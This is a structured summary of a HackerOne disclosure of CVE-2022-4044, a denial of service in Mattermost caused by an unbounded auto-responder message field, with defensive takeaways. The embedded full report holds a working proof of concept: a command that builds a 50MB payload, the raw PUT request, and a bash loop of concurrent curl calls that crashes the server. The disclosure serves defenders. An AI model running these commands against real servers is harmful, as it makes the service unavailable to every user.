# Denial of Service via Unlimited Auto-Responder Message Size

## Metadata
- **Source:** HackerOne
- **Report:** 1680241 | https://hackerone.com/reports/1680241
- **Submitted:** 2022-08-25
- **Reporter:** vultza
- **Program:** Mattermost
- **Bounty:** Not specified in writeup
- **Severity:** high
- **Vuln:** Denial of Service, Resource Exhaustion, Input Validation, Missing Size Constraints
- **CVEs:** CVE-2022-4044
- **Category:** memory-binary

## Summary
The auto-responder message field in user notification properties lacks size validation, allowing authenticated users to submit extremely large payloads (up to 50MB). Submitting multiple concurrent requests with massive message strings causes server resource exhaustion, leading to application crash and complete unavailability.

## Attack scenario
1. Attacker authenticates as a legitimate user and obtains MMAUTHTOKEN and CSRF token
2. Attacker generates a 50MB payload string containing repeated characters
3. Attacker sends PUT request to /api/v4/users/me/patch with oversized auto_responder_message value
4. Attacker sends 5+ concurrent requests simultaneously to amplify resource consumption
5. Server attempts to process and store massive data, consuming CPU and memory exponentially
6. Server becomes unresponsive and crashes, making application unavailable to all users

## Root cause
The auto_responder_message field in the user notification properties endpoint lacks input validation, size limits, and length constraints. The API accepts the request payload up to nginx's default 50MB limit without sanitizing or validating the message field length before processing and storage.

## Attacker mindset
An authenticated attacker with basic user privileges can weaponize a seemingly innocuous feature (auto-responder) to launch a resource exhaustion attack. The attacker recognizes that lack of input validation combined with concurrent request handling allows amplification of impact. The attack is trivial to execute and requires minimal technical sophistication.

## Defensive takeaways
- Implement strict maximum length constraints on all user-input fields, especially those stored in databases
- Add server-side validation for auto-responder message length (e.g., 1000-5000 character limit)
- Enforce request body size limits at the application layer independent of web server configuration
- Implement rate limiting on sensitive endpoints like user profile updates to prevent concurrent bulk submissions
- Add resource monitoring and automatic circuit breakers to detect and halt runaway requests
- Validate and sanitize input before database operations, not just during initial parsing
- Consider implementing async processing with queue limits for large data operations
- Add logging and alerting for abnormal request sizes or patterns

## Variant hunting
Search for other text fields accepting user input without length validation (bio, description, comments, messages)
Test custom fields, user metadata, or profile fields that may have similar constraints
Examine other PUT/PATCH endpoints that update user properties for similar missing validations
Check webhook payloads, integration messages, and other messaging features for oversized input handling
Investigate bulk operations (import users, batch updates) that might process multiple large payloads
Test file upload endpoints for lack of size validation (logos, attachments, avatars)

## MITRE ATT&CK
- T1498.1
- T1499.1
- T1190

## Notes
This is an authenticated DoS vulnerability with significant impact. The attack is reproducible and automated. The root cause is fundamental input validation failure. The fix should be simple (adding max length constraint) but the impact is severe (complete service unavailability). This demonstrates why even authenticated users must be subject to input validation and rate limiting controls.

## Full report
<details><summary>Expand</summary>

## Summary:
A user can enable and modify its automatic response message, that is automatically sent when the user has the "Out of Office" status. This response message doesn't have any size check or validation, which allows an attacker to set an almost unlimited number of characters as the response value.

In a production environment is possible to set up to 50MB of data, due to the default nginx configuration, as the response message value, which causes the server to stop responding to user requests and ultimately leads to the server crash due to the incapacity to update and handle such a large amount of data.

## Steps To Reproduce:

1. Login as a normal user in the platform.
2. Grab the `MMAUTHTOKEN` authentication token.
3. Generate the payload string, which consists in 50000000(50MB) characters. Python can be used for this:
   ```bash
   python2.7 -c "print 'A' * 50000000"
   ```
4. Send the following `PUT` request to the `/api/v4/users/me/patch` API Endpoint:
   ```
   PUT http://localhost:8065/api/v4/users/me/patch
   Content-Type: application/json
   X-CSRF-TOKEN: <csrf-token>
   Cookie: MMAUTHTOKEN=<token>
   
   {"notify_props":{"auto_responder_active":"true","auto_responder_message":"<payload>"}}
   ```
5. For a greater impact, the above request should be sent 5 times at the same time. After the requests are sent, the server will start to consume an abnormal quantity of computing resources, and crashes after some seconds.
6. The application becomes unavailable for all its users.

The steps 3-6 can be automated using the following 2 commands:

```bash
$ python2.7 -c "print '{\"notify_props\":{\"auto_responder_active\":\"true\",\"auto_responder_message\":\"' + 'A' * 50000000 + '\"}}'" > payload

$ for ((i = 0; i < 5; i++)); do curl -X PUT "http://<domain>/api/v4/users/me/patch" -H 'Content-Type: application/json' -d @payload --cookie "MMAUTHTOKEN=<token>" -H "X-CSRF-TOKEN: <csrf-token>" &; done;
```
## Supporting Material/References:

  *  PoC Video 
{F1883883}

## Impact

A user can cause a full denial of service attack in the application server, making the application server unavailable to all its users.

</details>

---
*Analysed by Claude on 2026-05-24*
